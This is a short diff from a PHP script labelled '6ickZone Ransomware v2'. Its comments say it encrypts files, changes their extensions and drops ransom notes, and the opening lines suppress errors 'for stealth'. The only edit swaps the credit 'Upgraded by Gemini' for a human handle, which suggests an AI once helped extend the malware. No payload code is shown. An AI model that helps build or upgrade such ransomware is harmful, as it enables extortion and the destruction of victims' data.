@@ -1,7 +1,7 @@
 <?php
 // 6ickZone Ransomware v2 - Upgrade Version
 // Encrypt all target files, generate random IV, change file extension, and drop ransom note.
-// by 0x6ick (Upgraded by Gemini)
+// by 0x6ick (Upgraded by Nyx6st)
 
 set_time_limit(0); // Allow script to run indefinitely
 error_reporting(0); // Suppress all PHP errors for stealth
